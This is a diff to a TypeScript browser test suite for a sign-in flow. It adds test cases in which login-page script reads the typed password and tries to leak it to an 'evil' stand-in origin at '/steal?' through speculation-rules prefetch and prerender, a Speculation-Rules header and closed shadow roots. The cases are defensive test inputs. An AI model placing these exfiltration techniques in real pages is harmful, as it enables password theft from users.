@@ -75,12 +75,23 @@ describe(signIn, () => {
     let evil: Awaited<ReturnType<typeof site>>;
     let login: Awaited<ReturnType<typeof site>>;
     /** What the login site serves at `/` and answers at `/session`; each case sets them. */
-    const fixture: { evil: string; home: string; onSession: Handler; page: string; popup: string; worker: string } = {
+    const fixture: {
+        evil: string;
+        headers: Record<string, string>;
+        home: string;
+        onSession: Handler;
+        page: string;
+        popup: string;
+        rules: string;
+        worker: string;
+    } = {
         evil: "",
+        headers: {},
         home: "",
         onSession: () => undefined,
         page: "",
         popup: "",
+        rules: "",
         worker: "",
     };
     /** Every UDP datagram the other site's address receives: where WebRTC talks to a TURN server. */
@@ -99,17 +110,36 @@ describe(signIn, () => {
         });
         turn = `turn:127.0.0.2:${udp.address().port}`;
         login = await site("127.0.0.1", (request, response, body) => {
-            if (request.url === "/session") {
-                fixture.onSession(request, response, body);
-            } else if (request.url?.startsWith("/home")) {
-                html(response, fixture.home);
-            } else if (request.url === "/popup") {
-                html(response, fixture.popup);
-            } else if (request.url === "/worker.js") {
-                response.setHeader("content-type", "text/javascript");
-                response.end(fixture.worker);
-            } else {
-                html(response, fixture.page);
+            switch (request.url?.split("?", 1)[0]) {
+                case "/home": {
+                    html(response, fixture.home);
+                    break;
+                }
+                case "/popup": {
+                    html(response, fixture.popup);
+                    break;
+                }
+                case "/rules.json": {
+                    response.setHeader("content-type", "application/speculationrules+json");
+                    response.end(fixture.rules);
+                    break;
+                }
+                case "/session": {
+                    fixture.onSession(request, response, body);
+                    break;
+                }
+                case "/worker.js": {
+                    response.setHeader("content-type", "text/javascript");
+                    response.end(fixture.worker);
+                    break;
+                }
+                default: {
+                    for (const [name, value] of Object.entries(fixture.headers)) {
+                        response.setHeader(name, value);
+                    }
+
+                    html(response, fixture.page);
+                }
             }
         });
     });
@@ -126,6 +156,7 @@ describe(signIn, () => {
         page = await context.newPage();
         evil.hits.length = 0;
         login.hits.length = 0;
+        fixture.headers = {};
         datagrams.length = 0;
         fixture.home = "<h1>Home</h1>";
         fixture.onSession = (_request, response) => {
@@ -510,6 +541,12 @@ describe(signIn, () => {
         loginForm(
             `${before} document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); const pw = document.forms[0].pw.value; ${body} });`,
         );
+    /** Rules that prefetch every link in the document as soon as it is there. */
+    const EVERY_LINK = `{"prefetch":[{"eagerness":"immediate","source":"document"}]}`;
+    const linkTo = (origin: string): string => `const link = document.createElement("a"); link.href = "${origin}/steal?" + pw; document.body.append(link);`;
+    /** A script element of rules that prefetch and prerender an address on `origin` carrying `pw`. */
+    const speculationRules = (origin: string): string =>
+        `Object.assign(document.createElement("script"), { textContent: JSON.stringify({ prefetch: [{ source: "list", urls: ["${origin}/steal?" + pw] }], prerender: [{ source: "list", urls: ["${origin}/render?" + pw] }] }), type: "speculationrules" })`;
     const blobWorker = (realm: string): string =>
         `new ${realm}.Worker(${realm}.URL.createObjectURL(new ${realm}.Blob([${JSON.stringify(`${exfiltrate()} onmessage = (event) => send(event.data);`)}]))).postMessage(pw);`;
 
@@ -621,6 +658,42 @@ describe(signIn, () => {
                 return {
                     page: onSubmit(
                         `const link = document.createElement("link"); link.rel = "prefetch"; link.href = "${evil.origin}/steal?" + pw; document.head.append(link);`,
+                    ),
+                };
+            },
+        ],
+        [
+            "document speculation rules in the page, through a link a script adds",
+            () => {
+                return { page: `<script type="speculationrules">${EVERY_LINK}</script>${onSubmit(linkTo(evil.origin))}` };
+            },
+        ],
+        [
+            "document speculation rules from a Speculation-Rules header, through a link a script adds",
+            () => {
+                return { headers: { "speculation-rules": '"/rules.json"' }, page: onSubmit(linkTo(evil.origin)), rules: EVERY_LINK };
+            },
+        ],
+        [
+            "document speculation rules in a declarative shadow root, through a link a script adds",
+            () => {
+                return {
+                    page: `<div><template shadowrootmode="closed"><script type="speculationrules">${EVERY_LINK}</script></template></div>${onSubmit(linkTo(evil.origin))}`,
+                };
+            },
+        ],
+        [
+            "speculation rules a script adds",
+            () => {
+                return { page: onSubmit(`document.head.append(${speculationRules(evil.origin)});`) };
+            },
+        ],
+        [
+            "speculation rules a script adds in a closed shadow root",
+            () => {
+                return {
+                    page: onSubmit(
+                        `const host = document.createElement("div"); document.body.append(host); host.attachShadow({ mode: "closed" }).append(${speculationRules(evil.origin)});`,
                     ),
                 };
             },
